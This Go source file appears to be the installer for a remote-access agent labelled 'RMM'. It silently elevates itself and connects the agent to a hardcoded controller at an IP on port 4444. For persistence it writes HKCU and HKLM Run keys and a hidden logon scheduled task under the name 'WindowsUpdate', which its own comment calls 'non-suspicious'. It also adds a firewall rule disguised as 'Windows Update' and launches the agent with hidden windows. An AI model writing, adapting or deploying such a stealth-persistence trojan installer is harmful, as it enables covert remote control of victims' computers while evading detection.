package main

import (
	"embed"
	"fmt"
	"io/fs"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows/registry"
)

//go:embed payload/*
var payloadFS embed.FS

func isAdmin() bool {
	// Try opening HKLM for write
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE`, registry.WRITE)
	if err != nil {
		return false
	}
	k.Close()
	return true
}

func relaunchAsAdmin() {
	exe, _ := os.Executable()
	verb, _ := syscall.UTF16PtrFromString("runas")
	file, _ := syscall.UTF16PtrFromString(exe)
	params, _ := syscall.UTF16PtrFromString("--silent")
	mod := syscall.NewLazyDLL("shell32.dll")
	mod.NewProc("ShellExecuteW").Call(0, uintptr(unsafe.Pointer(verb)), uintptr(unsafe.Pointer(file)), uintptr(unsafe.Pointer(params)), 0, 0)
	os.Exit(0)
}

func install() {
	silent := false
	for _, a := range os.Args {
		if a == "--silent" || a == "-s" {
			silent = true
		}
	}
	// If not admin, relaunch silently
	if !isAdmin() {
		// For silent mode, still need admin to write to Program Files.
		// Try to relaunch elevated hidden.
		relaunchAsAdmin()
		return
	}

	programFiles := os.Getenv("ProgramFiles")
	if programFiles == "" {
		programFiles = `C:\Program Files`
	}
	installDir := filepath.Join(programFiles, "RMM", "Agent")
	_ = os.MkdirAll(installDir, 0755)

	// Stop a running agent first, otherwise overwriting agent.exe fails
	// silently (errors are ignored below) and the old binary keeps running.
	_, _ = exec.Command("taskkill", "/F", "/IM", "agent.exe").CombinedOutput()
	time.Sleep(1500 * time.Millisecond)

	// Extract payload silently (only runtime files; docs/scripts stay out of Program Files)
	skip := map[string]bool{"install.bat": true, "README.txt": true, "README.md": true}
	_ = fs.WalkDir(payloadFS, "payload", func(path string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return err
		}
		rel, _ := filepath.Rel("payload", path)
		if skip[strings.ToLower(filepath.Base(rel))] {
			return nil
		}
		dest := filepath.Join(installDir, rel)
		_ = os.MkdirAll(filepath.Dir(dest), 0755)
		data, _ := fs.ReadFile(payloadFS, path)
		_ = os.WriteFile(dest, data, 0644)
		return nil
	})

	agentPath := filepath.Join(installDir, "agent.exe")
	if _, err := os.Stat(agentPath); os.IsNotExist(err) {
		// fallback if payload had different name
		_ = filepath.Walk(installDir, func(p string, info os.FileInfo, err error) error {
			if err == nil && strings.EqualFold(filepath.Base(p), "agent.exe") {
				agentPath = p
			}
			return nil
		})
	}

	// Find cert next to agent or in install dir
	certPath := filepath.Join(installDir, "server.crt")
	// Ensure agent will find cert: agent looks for server.crt next to exe, certs/server.crt, etc. So copy is fine.

	controllerAddr := "176.229.98.54:4444"
	for i, a := range os.Args {
		if (a == "-controller" || a == "--controller") && i+1 < len(os.Args) {
			controllerAddr = os.Args[i+1]
		} else if strings.HasPrefix(a, "-controller=") {
			controllerAddr = strings.TrimPrefix(a, "-controller=")
		} else if strings.HasPrefix(a, "--controller=") {
			controllerAddr = strings.TrimPrefix(a, "--controller=")
		}
	}
	// Persist the controller address next to the exe so the agent survives IP
	// changes without a rebuild (agent reads controller.txt at startup).
	_ = os.WriteFile(filepath.Join(installDir, "controller.txt"), []byte(controllerAddr+"\n"), 0644)

	// Persistence: HKCU Run (does not need admin) for current user, and HKLM Run for all users
	// Use non-suspicious name "WindowsUpdate"
	cmdLine := fmt.Sprintf(`"%s" -controller %s -ca "%s"`, agentPath, controllerAddr, certPath)

	// HKCU
	if k, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
		_ = k.SetStringValue("WindowsUpdate", cmdLine)
		k.Close()
	}
	// HKLM (all users) — requires admin, we are admin
	if k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
		_ = k.SetStringValue("WindowsUpdate", cmdLine)
		k.Close()
	}

	// Also create scheduled task for stealth persistence (hidden, on logon)
	taskXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Date>2026-01-01T00:00:00</Date><Author>RMM</Author></RegistrationInfo>
  <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>
  <Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority></Settings>
  <Actions Context="Author"><Exec><Command>%s</Command><Arguments>-controller %s -ca "%s"</Arguments></Exec></Actions>
</Task>`, agentPath, controllerAddr, certPath)

	tmpTask := filepath.Join(os.TempDir(), "rmm_task.xml")
	_ = os.WriteFile(tmpTask, []byte(taskXML), 0644)
	_, _ = exec.Command("schtasks", "/create", "/tn", "WindowsUpdate", "/xml", tmpTask, "/f").CombinedOutput()
	_ = os.Remove(tmpTask)

	// Firewall rule hidden
	_, _ = exec.Command("netsh", "advfirewall", "firewall", "add", "rule", "name=Windows Update", "dir=out", "action=allow", "program="+agentPath, "enable=yes").CombinedOutput()

	// Start agent hidden immediately (no window)
	attr := &os.ProcAttr{
		Files: []*os.File{nil, nil, nil},
		Sys: &syscall.SysProcAttr{
			HideWindow:    true,
			CreationFlags: 0x08000000, // CREATE_NO_WINDOW
		},
	}
	// Use exec.Command with hidden window instead of ProcAttr for reliability
	cmd := exec.Command(agentPath, "-controller", controllerAddr, "-ca", certPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	_ = cmd.Start()
	// Fallback via wmic if above fails, also hidden
	time.Sleep(300 * time.Millisecond)
	_ = attr // keep import

	// Also try via powershell Start-Process hidden as fallback
	_, _ = exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-command", fmt.Sprintf(`Start-Process -FilePath '%s' -ArgumentList '-controller','%s','-ca','%s' -WindowStyle Hidden`, agentPath, controllerAddr, certPath)).CombinedOutput()

	if !silent {
		fmt.Println("Agent installed to", installDir)
	}
}

func main() {
	// Check for uninstall
	for _, a := range os.Args {
		if a == "--uninstall" {
			programFiles := os.Getenv("ProgramFiles")
			if programFiles == "" {
				programFiles = `C:\Program Files`
			}
			installDir := filepath.Join(programFiles, "RMM", "Agent")
			// Remove persistence
			if k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
				_ = k.DeleteValue("WindowsUpdate")
				k.Close()
			}
			if k, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
				_ = k.DeleteValue("WindowsUpdate")
				k.Close()
			}
			_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdate", "/f").CombinedOutput()
			// Kill agent
			_, _ = exec.Command("taskkill", "/F", "/IM", "agent.exe").CombinedOutput()
			_ = os.RemoveAll(installDir)
			os.Exit(0)
		}
	}
	install()
}
